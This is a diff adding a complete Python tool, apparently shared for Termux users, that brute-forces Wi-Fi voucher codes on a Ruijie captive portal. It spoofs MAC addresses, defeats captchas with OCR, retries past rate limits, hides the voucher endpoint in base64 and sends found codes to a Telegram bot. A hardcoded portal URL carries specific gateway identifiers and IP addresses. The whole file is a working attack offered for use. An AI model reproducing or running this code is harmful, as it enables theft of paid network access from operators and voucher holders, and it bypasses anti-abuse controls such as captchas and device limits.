@@ -1,0 +1,396 @@
+#!/usr/bin/env python3
+# ==============================================
+#  🕷️ SPIDER - Ruijie Voucher Scanner  —  v11.0
+#  - Termux Optimized
+#  - Multi-Charset Support
+#  - Mixed Lengths
+#  - Telegram Alerts
+# ==============================================
+
+import requests
+import threading
+import time
+import sys
+import os
+import asyncio
+import aiohttp
+import base64
+import random
+import re
+import string
+import json
+from datetime import datetime
+
+# ── Termux Path Fix ──
+os.environ['OPENCV_IO_ENABLE_OPENEXR'] = '1'
+
+try:
+    import cv2
+    import ddddocr
+    import numpy as np
+    _HAS_OCR = True
+except ImportError:
+    _HAS_OCR = False
+    print("⚠️ OpenCV/DDDDOCR not installed. Captcha will be skipped.")
+    print("📌 Install: pip install opencv-python ddddocr numpy")
+
+# ========== COLORS & UI ==========
+C_RESET = "\033[0m"
+C_BOLD  = "\033[1m"
+C_GREEN = "\033[1;32m"
+C_RED   = "\033[1;31m"
+C_YELLOW = "\033[1;33m"
+C_BLUE  = "\033[1;34m"
+C_CYAN  = "\033[1;36m"
+C_MAGENTA = "\033[1;35m"
+C_WHITE = "\033[1;37m"
+
+# ==============================================
+#  🕷️ SPIDER LOGO
+# ==============================================
+BANNER = f"""
+{C_MAGENTA}╔══════════════════════════════════════════════════════════════════╗
+║                                                                          ║
+║     {C_WHITE}███████╗██████╗ ██╗██████╗ ███████╗██████╗ {C_MAGENTA}          ║
+║     {C_WHITE}██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔══██╗{C_MAGENTA}         ║
+║     {C_WHITE}███████╗██████╔╝██║██████╔╝█████╗  ██████╔╝{C_MAGENTA}         ║
+║     {C_WHITE}╚════██║██╔═══╝ ██║██╔══██╗██╔══╝  ██╔══██╗{C_MAGENTA}         ║
+║     {C_WHITE}███████║██║     ██║██║  ██║███████╗██║  ██║{C_MAGENTA}         ║
+║     {C_WHITE}╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{C_MAGENTA}         ║
+║                                                                          ║
+║     {C_YELLOW}🕷️  S P I D E R   S C A N N E R   v 1 1 . 0  🕷️{C_MAGENTA}      ║
+║                                                                          ║
+║     {C_CYAN}⚡ Built for Termux | @Spider_man1245 ⚡{C_MAGENTA}             ║
+║                                                                          ║
+╚══════════════════════════════════════════════════════════════════════╝{C_RESET}
+"""
+
+def log_result(msg):
+    sys.stdout.write(f"\r\033[K{msg}\n")
+    sys.stdout.flush()
+
+# ========== CONFIGURATION ==========
+TARGET_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=9cce887e2b7e&gw_sn=H1U72QB006007&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.46&mac=30:f2:3c:ef:bf:37&slot_num=8&nasip=192.168.1.38&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C140&chap_challenge=%5C037%5C061%5C072%5C122%5C040%5C141%5C252%5C331%5C122%5C375%5C042%5C015%5C130%5C263%5C365%5C222%5C"
+RESULT_FILE = os.path.expanduser("~/spider_results.txt")
+TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"  # Optional
+TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"      # Optional
+
+# 🕷️ SPIDER engine globals
+_connector = None
+_voucher_sem = None
+_ocr = None
+stop_flag = False
+tried = 0
+hits = []
+lock = threading.Lock()
+start_time = None
+
+# =============================================
+#  HELPERS
+# =============================================
+def send_telegram(message):
+    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN": return
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    try: requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": f"🕷️ {message}"}, timeout=3)
+    except: pass
+
+def get_mac():
+    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
+    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))
+
+def replace_mac(url, new_mac):
+    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
+
+async def get_session_id(sess, session_url, previous=None):
+    url = replace_mac(session_url, get_mac())
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9',
+        'priority': 'u=0, i',
+        'referer': url,
+        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
+        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
+    }
+    try:
+        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
+            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
+            return sid.group(1) if sid else previous
+    except: return previous
+
+def _init_ocr():
+    global _ocr
+    if _ocr is None and _HAS_OCR:
+        try: _ocr = ddddocr.DdddOcr(show_ad=False)
+        except: _ocr = None
+    return _ocr
+
+def _ocr_sync(image_bytes):
+    ocr = _init_ocr()
+    if ocr is None: return None
+    nparr = np.frombuffer(image_bytes, np.uint8)
+    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+    if img is None: return None
+    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+    blur = cv2.GaussianBlur(gray, (3, 3), 0)
+    _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
+    _, buf = cv2.imencode('.png', th)
+    return ocr.classification(buf.tobytes()).upper()
+
+async def Captcha_Text(img_bytes): return await asyncio.to_thread(_ocr_sync, img_bytes)
+
+async def Captcha_Image(sess, session_id):
+    h = {
+        'authority': 'portal-as.ruijienetworks.com',
+        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
+        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Linux"',
+        'sec-fetch-dest': 'image',
+        'sec-fetch-mode': 'no-cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
+    }
+    async with sess.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params={'sessionId': session_id, '_t': str(time.time())}, headers=h, ssl=False) as r:
+        return await r.read()
+
+async def Varify_Captcha(sess, session_id, text):
+    h = {
+        'authority': 'portal-as.ruijienetworks.com',
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+        'content-type': 'application/json',
+        'origin': 'https://portal-as.ruijienetworks.com',
+        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Linux"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
+    }
+    async with sess.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=h, json={'sessionId': session_id, 'authCode': text}, ssl=False) as r:
+        d = await r.json()
+        return session_id if d.get("success") is True else None
+
+async def Code_Expires_Date(session_id):
+    h_macc2 = {'authority': 'portal-as.ruijienetworks.com', 'accept': 'application/json, */*; q=0.01', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'}
+    h_auth = {'authority': 'portal-as.ruijienetworks.com', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'en-US,en;q=0.9', 'content-type': 'application/json;', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0', 'x-requested-with': 'XMLHttpRequest'}
+    endpoints = [(f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}', h_auth), (f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}', h_macc2)]
+    for url, headers in endpoints:
+        try:
+            async with aiohttp.ClientSession(connector=_connector, connector_owner=False, cookie_jar=aiohttp.CookieJar(), timeout=aiohttp.ClientTimeout(total=15)) as s:
+                async with s.get(url, headers=headers, ssl=False) as r:
+                    data = await r.json()
+                    res = data.get('result', {})
+                    if not res:
+                        res = data.get('data', {})
+                    plan = res.get('profileName', 'Unknown')
+                    remaining = res.get('remainingMinutes')
+                    if remaining is not None:
+                        remaining = int(remaining)
+                        if remaining >= 0:
+                            hh, mm = divmod(remaining, 60)
+                            time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
+                        else:
+                            time_str = f"Expired ({remaining} mins)"
+                        return f"Plan: {plan} | Time: {time_str}"
+                    total = res.get('totalMinutes')
+                    if total is not None:
+                        hh, mm = divmod(int(total), 60)
+                        time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
+                        return f"Plan: {plan} | Time: {time_str}"
+        except: continue
+    return "Plan: Unknown | Time: Unknown"
+
+_post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
+
+async def perform_check(session_url, code):
+    global tried, hits
+    response = None
+    for attempt in range(3):
+        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, cookie_jar=aiohttp.CookieJar(), timeout=aiohttp.ClientTimeout(total=30)) as sess:
+            session_id = await get_session_id(sess, session_url)
+            if not session_id: return
+            auth_code = None
+            if _HAS_OCR:
+                for _ in range(8):
+                    try:
+                        img = await Captcha_Image(sess, session_id)
+                        text = await Captcha_Text(img)
+                        if text and await Varify_Captcha(sess, session_id, text):
+                            auth_code = text
+                            break
+                    except: pass
+            if not auth_code:
+                if not _HAS_OCR: auth_code = ""
+                else: return
+            if stop_flag: return
+            payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
+            headers = {
+                "authority": "portal-as.ruijienetworks.com",
+                "accept": "*/*",
+                "accept-language": "en-US,en;q=0.9",
+                "content-type": "application/json",
+                "origin": "https://portal-as.ruijienetworks.com",
+                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
+                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+                "sec-ch-ua-mobile": "?1",
+                "sec-ch-ua-platform": '"Android"',
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-origin",
+                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+            }
+            try:
+                async with sess.post(_post_url, json=payload, headers=headers, ssl=False) as r:
+                    response = await r.text()
+            except: return
+        if response and 'request limited' in response:
+            await asyncio.sleep(0.5)
+            continue
+        break
+    else: return
+
+    if not response: return
+
+    with lock: tried += 1
+
+    if 'logonUrl' in response:
+        info = await Code_Expires_Date(session_id)
+        with lock: hits.append(code)
+        try:
+            with open(RESULT_FILE, "a", encoding="utf-8") as f:
+                f.write(f"[🕷️ SUCCESS] {code}  |  {info}\n")
+        except: pass
+        send_telegram(f"✅ Voucher found: {code}\n{info}")
+        log_result(f"{C_GREEN}[🕷️+] SUCCESS: {code} | {info}{C_RESET}")
+
+    elif 'STA' in response:
+        info = await Code_Expires_Date(session_id)
+        log_result(f"{C_YELLOW}[🕷️!] LIMITED: {code} | {info}{C_RESET}")
+
+# =============================================
+#  ITERATORS
+# =============================================
+def iter_custom_codes(lengths, charset):
+    while not stop_flag:
+        for length in lengths:
+            yield "".join(random.choice(charset) for _ in range(length))
+
+def iter_range_codes(start, end):
+    digits = max(len(str(start)), len(str(end)))
+    codes = [str(i).zfill(digits) for i in range(start, end + 1)]
+    random.shuffle(codes)
+    for c in codes: yield c
+
+# =============================================
+#  UI & RUNNER
+# =============================================
+def stats_printer():
+    global start_time
+    start_time = time.time()
+    while not stop_flag:
+        time.sleep(0.3)
+        elapsed = time.time() - start_time
+        speed = tried / elapsed if elapsed > 0 else 0
+        status = f"\r\033[K{C_MAGENTA}🕷️ SPIDER{C_RESET} {C_CYAN}{speed:.1f}{C_RESET}c/s | {C_YELLOW}T:{tried}{C_RESET} | {C_GREEN}H:{len(hits)}{C_RESET} | {C_BOLD}{tried:06d}{C_RESET}"
+        sys.stdout.write(status)
+        sys.stdout.flush()
+
+async def run_scanner(session_url, code_iter, workers):
+    global _voucher_sem, stop_flag, _connector, tried, hits
+    _init_ocr()
+    tried, hits = 0, []
+    stop_flag = False
+    _connector = aiohttp.TCPConnector(limit=2000, ttl_dns_cache=300, ssl=False)
+    _voucher_sem = asyncio.Semaphore(workers)
+
+    stats_thread = threading.Thread(target=stats_printer, daemon=True)
+    stats_thread.start()
+
+    try:
+        while not stop_flag:
+            batch = []
+            for _ in range(1000):
+                try: batch.append(next(code_iter))
+                except StopIteration: break
+            if not batch: break
+            async def _check(c):
+                async with _voucher_sem: await perform_check(session_url, c)
+            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
+    except (asyncio.CancelledError, KeyboardInterrupt): stop_flag = True
+    finally:
+        stop_flag = True
+        await _connector.close()
+    print(f"\n{C_BOLD}{C_GREEN}[🕷️] Spider finished!{C_RESET}")
+
+# =============================================
+#  MAIN
+# =============================================
+def main():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(BANNER)
+
+    print(f"{C_BOLD}[ 1 ]{C_RESET} Default URL")
+    print(f"{C_BOLD}[ 2 ]{C_RESET} New URL")
+    choice = input(f"\n{C_CYAN}Choice: {C_RESET}").strip()
+    session_url = TARGET_URL
+    if choice == "2": session_url = input(f"{C_CYAN}URL: {C_RESET}").strip()
+
+    print(f"\n{C_BOLD}--- Mode Selection ---{C_RESET}")
+    print(f"{C_BOLD}[ 1 ]{C_RESET} Numeric Range (0-9)")
+    print(f"{C_BOLD}[ 2 ]{C_RESET} Random Mode (Infinite)")
+    mode = input(f"\n{C_CYAN}Mode: {C_RESET}").strip()
+
+    code_iter = None
+    if mode == "1":
+        s = int(input(f"{C_CYAN}Start: {C_RESET}"))
+        e = int(input(f"{C_CYAN}End: {C_RESET}"))
+        code_iter = iter_range_codes(s, e)
+    elif mode == "2":
+        print(f"\n{C_BOLD}--- Charset Selection ---{C_RESET}")
+        print(f"{C_BOLD}[ 1 ]{C_RESET} Digits only (0-9)")
+        print(f"{C_BOLD}[ 2 ]{C_RESET} Letters only (a-z, A-Z)")
+        print(f"{C_BOLD}[ 3 ]{C_RESET} Alphanumeric (0-9, a-z, A-Z)")
+        c_choice = input(f"{C_CYAN}Charset: {C_RESET}").strip()
+
+        charset = string.digits
+        if c_choice == "2": charset = string.ascii_letters
+        elif c_choice == "3": charset = string.ascii_letters + string.digits
+
+        print(f"\n{C_BOLD}--- Length Selection ---{C_RESET}")
+        print(f"{C_BOLD}[ 1 ]{C_RESET} 6-digit")
+        print(f"{C_BOLD}[ 2 ]{C_RESET} 8-digit")
+        print(f"{C_BOLD}[ 3 ]{C_RESET} Mixed (6, 7, 8, 9, 10)")
+        print(f"{C_BOLD}[ 4 ]{C_RESET} Custom (e.g. 6,8,12)")
+        l_choice = input(f"{C_CYAN}Length: {C_RESET}").strip()
+
+        lengths = [6]
+        if l_choice == "2": lengths = [8]
+        elif l_choice == "3": lengths = [6, 7, 8, 9, 10]
+        elif l_choice == "4":
+            lengths = input(f"{C_CYAN}Enter lengths (e.g. 6,8): {C_RESET}").split(',')
+            lengths = [int(x.strip()) for x in lengths if x.strip().isdigit()]
+
+        code_iter = iter_custom_codes(lengths, charset)
+
+    workers = input(f"\n{C_CYAN}Threads (100): {C_RESET}").strip()
+    workers = int(workers) if workers else 100
+
+    confirm = input(f"\n{C_CYAN}Start? (yes): {C_RESET}").strip().lower()
+    if confirm == "yes":
+        print(f"\n{C_BOLD}{C_MAGENTA}[🕷️] Spider scanning...{C_RESET}\n")
+        asyncio.run(run_scanner(session_url, code_iter, workers))
+
+if __name__ == "__main__":
+    main()
